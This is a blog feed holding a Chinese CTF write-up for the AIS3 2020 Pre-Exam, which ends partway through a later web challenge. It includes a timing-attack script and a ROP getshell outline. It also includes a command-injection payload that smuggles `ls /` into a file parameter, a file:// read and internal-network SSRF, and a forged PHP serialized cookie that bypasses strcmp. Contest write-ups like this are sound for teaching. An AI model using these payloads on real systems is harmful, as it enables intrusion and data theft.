<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Star Note</title>
  
  <subtitle>星筆記</subtitle>
  <link href="https://twinklestar03.com/atom.xml" rel="self"/>
  
  <link href="https://twinklestar03.com/"/>
  <updated>2020-12-18T07:36:23.813Z</updated>
  <id>https://twinklestar03.com/</id>
  
  <author>
    <name>TwinkleStar03</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>AIS3-2020 Pre-Exam Writeup</title>
    <link href="https://twinklestar03.com/Contest/CTF/AIS3_2020_Pre-Exam_Writeup/"/>
    <id>https://twinklestar03.com/Contest/CTF/AIS3_2020_Pre-Exam_Writeup/</id>
    <published>2020-06-19T16:00:00.000Z</published>
    <updated>2020-12-18T07:36:23.813Z</updated>
    
    <content type="html"><![CDATA[<p>從接觸CTF到現在已經過了一年，在CTF的技術上的確進步了不少，但還有很長一段路要走呢!</p><p>結果Pwn沒解掉幾題，花大部分時間在看web…事後看了pwn的題目才發現自己解的掉…早知道就先打PwnㄉQAQ</p><a id="more"></a><p>這次解掉的題目…</p><ul><li><p>🐧Misc</p><ul><li>💤Piquero</li><li>🐥Karuego</li><li>🌱Soy</li><li>👑Saburo</li></ul></li><li><p>♻️Reverse</p><ul><li>🍍TsaiBro</li><li>🎹Fallen Beat</li></ul></li><li><p>💥 Pwn</p><ul><li>👻 BOF</li></ul></li><li><p>🙊 Crypto</p><ul><li>🦕 Brontosaurus</li><li>🦖 T-Rex</li></ul></li><li><p>🌐Web</p><ul><li>🐿️Squirrel</li><li>🦈Shark</li><li>🐘Elephant</li><li>🐍Snake</li><li>🦉Owl</li></ul></li></ul><hr><h2 id="🐧Misc"><a href="#🐧Misc" class="headerlink" title="🐧Misc"></a>🐧Misc</h2><h3 id="💤Piquero"><a href="#💤Piquero" class="headerlink" title="💤Piquero"></a>💤Piquero</h3><p>盲人點字，找表找了很久，然後一個一個字慢慢對…</p><p>Flag: <code>AIS3&#123;I_feel_sleepy_Good_Night!!!&#125;</code></p><h3 id="🐥Karuego"><a href="#🐥Karuego" class="headerlink" title="🐥Karuego"></a>🐥Karuego</h3><p>拿到一張圖片:<br><img src="/images/AIS3_2020_Pre-Exam/Karuego.png" alt="Karuego.png"></p><p>感覺圖片裡面有放東西，先拿去binwalk…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 2880 x 1492, 8-bit&#x2F;color RGBA, non-interlaced</span><br><span class="line">41            0x29            Zlib compressed data, compressed</span><br><span class="line">2059568       0x1F6D30        Zip archive data, at least v1.0 to extract, name: files&#x2F;</span><br><span class="line">2059632       0x1F6D70        Zip archive data, encrypted at least v2.0 to extract, compressed size: 113020, uncompressed size: 113110, name: files&#x2F;3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg</span><br><span class="line">2172779       0x21276B        Zip archive data, encrypted at least v2.0 to extract, compressed size: 1087747, uncompressed size: 1092860, name: files&#x2F;Demon.png</span><br><span class="line">3260899       0x31C1E3        End of Zip archive, footer length: 22</span><br></pre></td></tr></table></figure><p>裏頭的確有東西，<code>binwalk -e</code> extract出來，之後看到一個被鎖起來的zip，不知道怎麼找密碼就用fcrackzip把密碼炸出來，之後就拿到帶有flag的圖片。</p><p><img src="/images/AIS3_2020_Pre-Exam/Demon.png" alt="Demon.png"></p><h3 id="🌱Soy"><a href="#🌱Soy" class="headerlink" title="🌱Soy"></a>🌱Soy</h3><p>拿到一張失去一部分的QRCode</p><p><img src="/images/AIS3_2020_Pre-Exam/Soy.png" alt="Soy.png"></p><p>找了找網路資源找到了關於QRCode復原的<a href="https://www.robertxiao.ca/hacking/ctf-writeup/mma2015-qrcode/">文章</a>，順著文章研究了QRCode的運作方式後，我用QRazyBox這個工具在上面一個一個像素點出來，之後讓他配合error Correction來把完整資訊extract出來</p><p><img src="/images/AIS3_2020_Pre-Exam/QRazyBox.png" alt="QRazyBox">  </p><p>Flag: <code> AIS3&#123;H0w_c4n_y0u_f1nd_me?!?!?!!&#125;</code></p><h3 id="👑Saburo"><a href="#👑Saburo" class="headerlink" title="👑Saburo"></a>👑Saburo</h3><p>拿到一個位置，nc上去之後稍微摸索後發現: 只要送出的字串跟Flag部分相同的話就會回傳更大的時間，但是這個時間前後有點誤差，而且長度越長它誤差越大，所以我選擇多傳幾次然後取平均值來決定這個是不是正確的字元。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Flag: A</span><br><span class="line">Haha, you lose in 26 milliseconds.</span><br><span class="line">---</span><br><span class="line">Flag: AI</span><br><span class="line">Haha, you lose in 37 milliseconds.</span><br><span class="line">---</span><br><span class="line">Flag: AIS</span><br><span class="line">Haha, you lose in 55 milliseconds.</span><br></pre></td></tr></table></figure><p>所以我寫了一個Python腳本來幫我拼出Flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag_it</span>():</span></span><br><span class="line">    flag = <span class="string">&#x27;AIS3&#123;&#x27;</span></span><br><span class="line">    pre_avg = <span class="number">75</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> char_set:</span><br><span class="line">            tmp_flag = flag + c</span><br><span class="line">            avg = []</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">5</span>):</span><br><span class="line">                avg.append(send(tmp_flag))</span><br><span class="line">            avg = <span class="built_in">sum</span>(avg) / <span class="built_in">len</span>(avg)</span><br><span class="line">            print(<span class="string">&#x27;Now: &#123;&#125;, Now_Avg: &#123;&#125;, Pre_Avg: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(c, avg, pre_avg))</span><br><span class="line">            <span class="keyword">if</span> avg &gt; pre_avg:</span><br><span class="line">                pre_avg = avg + <span class="number">5</span></span><br><span class="line">                flag = tmp_flag</span><br><span class="line">                print(<span class="string">&#x27;Found one char! Flag:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Flag: <code>AIS3&#123;A1r1ght_U_4r3_my_3n3nnies&#125;</code></p><hr><h2 id="♻️Reverse"><a href="#♻️Reverse" class="headerlink" title="♻️Reverse"></a>♻️Reverse</h2><h3 id="🍍TsaiBro"><a href="#🍍TsaiBro" class="headerlink" title="🍍TsaiBro"></a>🍍TsaiBro</h3><p>一開始拿到一個binary跟一個txt，binary會根據參數來印出對應的密文<br>因為懶惰所以沒有去逆向那個binary，反而直接蓋一個對照表起來，最後寫個腳本把Flag找出來…</p><p>Flag: <code>AIS3&#123;y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3&#125;</code></p><h3 id="🎹Fallen-Beat"><a href="#🎹Fallen-Beat" class="headerlink" title="🎹Fallen Beat"></a>🎹Fallen Beat</h3><p>拿到一個Jar做的音G，音樂動人(?</p><p>拿去餵給jd-gui去逆向來看看flag的邏輯，然後在<code>PanelEnding.class</code>裏頭找到Flag的陣列。<br>繼續往下找可以找到解密Flag的邏輯，最後找到cache來對這個陣列做XOR就可以找出Flag了!<br>Cache是<code>songs/gekkou/hell</code>這個看起來像是譜面的東西，實際上裏頭裝著Cache會載入的東西。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] flag = <span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; </span><br><span class="line">      <span class="number">89</span>, <span class="number">74</span>, <span class="number">75</span>, <span class="number">43</span>, <span class="number">126</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">109</span>, <span class="number">68</span>, <span class="number">109</span>, </span><br><span class="line">      <span class="number">109</span>, <span class="number">97</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">45</span>, <span class="number">113</span>, <span class="number">102</span>, <span class="number">64</span>, <span class="number">121</span>, <span class="number">47</span>, </span><br><span class="line">      <span class="number">111</span>, <span class="number">119</span>, <span class="number">111</span>, <span class="number">71</span>, <span class="number">114</span>, <span class="number">125</span>, <span class="number">68</span>, <span class="number">105</span>, Byte.MAX_VALUE, <span class="number">124</span>, </span><br><span class="line">      <span class="number">94</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">107</span>, <span class="number">97</span>, <span class="number">104</span> &#125;;</span><br><span class="line">      </span><br><span class="line"><span class="keyword">if</span> (t == mc) &#123;</span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cache.size(); i++)</span><br><span class="line">        <span class="keyword">this</span>.flag[i % <span class="keyword">this</span>.flag.length] = (<span class="keyword">byte</span>)(<span class="keyword">this</span>.flag[i % <span class="keyword">this</span>.flag.length] ^ ((Integer)cache.get(i)).intValue()); </span><br><span class="line">      String fff = <span class="keyword">new</span> String(<span class="keyword">this</span>.flag);</span><br><span class="line">      <span class="keyword">this</span>.text[<span class="number">0</span>].setText(String.format(<span class="string">&quot;Flag: %s&quot;</span>, <span class="keyword">new</span> Object[] &#123; fff &#125;));</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>寫個腳本把Flag XOR回來。</p><p>Flag: <code>AIS3&#123;Wow_how_m4ny_h4nds_do_you_h4ve&#125;</code></p><hr><h2 id="💥-Pwn"><a href="#💥-Pwn" class="headerlink" title="💥 Pwn"></a>💥 Pwn</h2><h3 id="👻-BOF"><a href="#👻-BOF" class="headerlink" title="👻 BOF"></a>👻 BOF</h3><p>有BufferOverflow的洞。</p><p>沒有在binary中找到可以直接開shell的函數，但是有<code>system@plt</code>可以用。<br>在64bit下透過register傳參數，所以找個可以<code>pop rdi; ret</code>的gadget來用就可以控制system的第一個參數了。</p><p>第一個參數要求的型態是<code>char[]</code>，直接填<code>&quot;/bin/sh&quot;</code>是沒辦法getshell的，在binary中有找到一個可以寫的.bss區域，配合<code>gets@plt</code>就可在那個位置寫<code>&quot;/bin/sh&quot;</code>，最後把該位置當參數傳給<code>system</code>就可以getshell了。</p><hr><h2 id="🙊-Crypto"><a href="#🙊-Crypto" class="headerlink" title="🙊 Crypto"></a>🙊 Crypto</h2><h3 id="🦕-Brontosaurus"><a href="#🦕-Brontosaurus" class="headerlink" title="🦕 Brontosaurus"></a>🦕 Brontosaurus</h3><p>恩…JSFuck，倒轉然後拿去console跑</p><p>Flag: ``</p><h3 id="🦖-T-Rex"><a href="#🦖-T-Rex" class="headerlink" title="🦖 T-Rex"></a>🦖 T-Rex</h3><p>給了對照表，直接Find+Replace把flag還原出來。</p><p>Flag: <code>AIS3&#123;TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3H907HUC69L6LTSH4KN3EURN49BIOUY6HBFCVJRZP0O83FWM0Z59IISJ5A2VFQG1QJ0LECYLA0A1UYIHTIIT1IWH0JX4T3ZJ1KSBRM9GED63CJVBQHQORVEJZELUJW5UG78B9PP1SIRM1IF500H52USDPIVRK7VGZULBO3RRE1OLNGNALX&#125;</code></p><hr><h2 id="🌐Web"><a href="#🌐Web" class="headerlink" title="🌐Web"></a>🌐Web</h2><h3 id="🐿️Squirrel"><a href="#🐿️Squirrel" class="headerlink" title="🐿️Squirrel"></a>🐿️Squirrel</h3><p>進到<code>https://squirrel.ais3.org/</code>看到一堆松鼠，翻了翻網頁找到了這段Javascript:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">const</span> squirrelFile = <span class="string">&#x27;/etc/passwd&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    fetch(<span class="string">&#x27;api.php?get=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(squirrelFile))</span><br><span class="line">      .then(<span class="function"><span class="params">res</span> =&gt;</span> res.json())</span><br><span class="line">      .then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;error&#x27;</span> <span class="keyword">in</span> data) &#123;</span><br><span class="line">          <span class="keyword">throw</span> data.error;</span><br><span class="line">        &#125;</span><br><span class="line">        data.output.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">          .map(<span class="function"><span class="params">line</span> =&gt;</span> line.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>].trim())</span><br><span class="line">          .filter(<span class="function"><span class="params">name</span> =&gt;</span> name.length)</span><br><span class="line">          .forEach(<span class="function"><span class="params">name</span> =&gt;</span> <span class="keyword">new</span> Squirrel(name).update());</span><br><span class="line">      &#125;)</span><br><span class="line">      .catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">        alert(<span class="string">&#x27;Something went wrong! Please report this to the author!&#x27;</span>);</span><br><span class="line">      &#125;);</span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>找到了一個會列出檔案的網頁: <code>https://squirrel.ais3.org/api.php</code>然後用<code>?get</code>來傳要列出的檔案，感覺可以做到arbritrary file read，所以就先看看能不能列出<code>api.php</code>它自己。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;Content-Type: application/json&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($file = @$_GET[<span class="string">&#x27;get&#x27;</span>]) &#123;</span><br><span class="line">    $output = shell_exec(<span class="string">&quot;cat &#x27;$file&#x27;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ($output !== <span class="literal">null</span>) &#123;</span><br><span class="line">        echo json_encode([</span><br><span class="line">            <span class="string">&#x27;output&#x27;</span> =&gt; $output</span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo json_encode([</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;cannot get file&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    echo json_encode([</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;empty file path&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>洩漏完原碼後發現有command injection的洞，所以就構造了<code>?get=&#39;; ls /&#39;</code>先對root做ls，得到以下內容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">5qu1rr3l_15_4_k1nd_0f_b16_r47.txt</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure><p>那個<code>5qu1rr3l_15_4_k1nd_0f_b16_r47.txt</code>看起來像Flag，所以就送<code>?get=/5qu1rr3l_15_4_k1nd_0f_b16_r47.txt</code>讀看看，就拿到Flag了。</p><p>Flag: <code>AIS3&#123;5qu1rr3l_15_4_k1nd_0f_b16_r47&#125;</code></p><h3 id="🦈Shark"><a href="#🦈Shark" class="headerlink" title="🦈Shark"></a>🦈Shark</h3><p>進到網頁後看到有個Hint可以點，Hint說Flag在某個內部伺服器，順便發現Hint是用<code>?path=</code>讀出來的，感覺有LFI的漏洞可以用…<br>所以就直接輸入<code>?path=index.php</code>看看能不能看到原始碼。</p><p>成功洩漏原碼後看到這段，過濾了一些符號，但還是可以用<code>file://</code>進行繞過來任意讀檔。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$path</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^(\.|\/)/&#x27;</span>, <span class="variable">$path</span>)) &#123;</span><br><span class="line">            <span class="comment">// disallow /path/like/this and ../this</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;[forbidden]&lt;/pre&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$content</span> = @file_get_contents(<span class="variable">$path</span>, <span class="literal">FALSE</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . (<span class="variable">$content</span> ? htmlentities(<span class="variable">$content</span>) : <span class="string">&#x27;[empty]&#x27;</span>) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因為說Flag運行在內部的伺服器內，所以我構造<code>?path=file:///proc/self/net/fib_trie</code>去讀了網路樹狀圖(?</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Main:</span><br><span class="line">  +-- 0.0.0.0&#x2F;0 3 0 5</span><br><span class="line">     |-- 0.0.0.0</span><br><span class="line">        &#x2F;0 universe UNICAST</span><br><span class="line">     +-- 127.0.0.0&#x2F;8 2 0 2</span><br><span class="line">        +-- 127.0.0.0&#x2F;31 1 0 0</span><br><span class="line">           |-- 127.0.0.0</span><br><span class="line">              &#x2F;32 link BROADCAST</span><br><span class="line">              &#x2F;8 host LOCAL</span><br><span class="line">           |-- 127.0.0.1</span><br><span class="line">              &#x2F;32 host LOCAL</span><br><span class="line">        |-- 127.255.255.255</span><br><span class="line">           &#x2F;32 link BROADCAST</span><br><span class="line">     +-- 172.22.0.0&#x2F;16 2 0 2</span><br><span class="line">        +-- 172.22.0.0&#x2F;30 2 0 2</span><br><span class="line">           |-- 172.22.0.0</span><br><span class="line">              &#x2F;32 link BROADCAST</span><br><span class="line">              &#x2F;16 link UNICAST</span><br><span class="line">           |-- 172.22.0.3</span><br><span class="line">              &#x2F;32 host LOCAL</span><br><span class="line">        |-- 172.22.255.255</span><br><span class="line">           &#x2F;32 link BROADCAST</span><br></pre></td></tr></table></figure><p>看了下IP，就從127.22.0.0開始找，然後用<code>?path=http://172.22.0.1/flag</code>來讀，沒多久就在127.22.0.2找到Flag。</p><p>Flag: <code>AIS3&#123;5h4rk5_d0n&#39;7_5w1m_b4ckw4rd5&#125;</code></p><h3 id="🐘Elephant"><a href="#🐘Elephant" class="headerlink" title="🐘Elephant"></a>🐘Elephant</h3><p>網頁有個可以輸入name的地方，先隨便打一些東西之後登入，然後就在網頁內找到一個提示<code>You may want to read the source code.</code>，所以就先朝著找原碼為目標前進。</p><p>試了一些方法，試到了<code>/.git/HEAD</code>的時候發現可以用GitHack來洩漏原碼。<br>進行洩漏得到了以下的程式碼:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">const</span> SESSION = <span class="string">&#x27;elephant_user&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] . rand());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">canReadFlag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> strcmp(<span class="variable">$flag</span>, <span class="keyword">$this</span>-&gt;token) == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;logout&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&#x27;Location: /&#x27;</span>);</span><br><span class="line">    setcookie(SESSION, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> User(<span class="variable">$name</span>);</span><br><span class="line">    header(<span class="string">&#x27;Location: /&#x27;</span>);</span><br><span class="line">    setcookie(SESSION, base64_encode(serialize(<span class="variable">$user</span>)), time() + <span class="number">600</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$data</span> = @<span class="variable">$_COOKIE</span>[SESSION]) &#123;</span><br><span class="line">    <span class="variable">$user</span> = unserialize(base64_decode(<span class="variable">$data</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以發現有個User類別，而輸入的Name會被儲存在裡面，然後如果token跟Flag一樣的話就會印出Flag，然後這個User會被serialize後存在Cookie內，如果Cookie裏頭已經有內容的話則會拿出來Unserialze，所以User內的資料是可以被控制的!</p><p>觀察一下後在strcmp發現了弱比較的露洞。<br>如果放進去的是兩個String，那回傳值只有<code>&gt;0, &lt;0, ==0</code>，可是放入其他不是String的東西的時候會回傳<code>NULL</code>。<br>而<code>strcmp($flag, $this-&gt;token) == 0</code>用弱比較來檢查，所以<code>NULL</code>會被視為<code>0</code>，那這個驗證就可以被繞過啦。</p><p>我寫了一段php來產出最終的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = <span class="keyword">array</span>(<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">canReadFlag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> strcmp(<span class="variable">$flag</span>, <span class="keyword">$this</span>-&gt;token) == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> User(<span class="string">&#x27;TwinkleStar03&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span>(base64_encode(serialize(<span class="variable">$user</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&gt; Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6MTM6IlR3aW5rbGVTdGFyMDMiO3M6MTE6IgBVc2VyAHRva2VuIjthOjI6e2k6MDtzOjE6IkEiO2k6MTtzOjE6IkIiO319</span><br></pre></td></tr></table></figure><p>最後把這段b64放到Cookie上，然後重整頁面Flag就出來了!</p><p>Flag: <code>AIS3&#123;0nly_3l3ph4n75_5h0uld_0wn_1v0ry&#125;</code></p><h3 id="🐍Snake"><a href="#🐍Snake" class="headerlink" title="🐍Snake"></a>🐍Snake</h3><p>這題一進到網頁就給出了Code</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 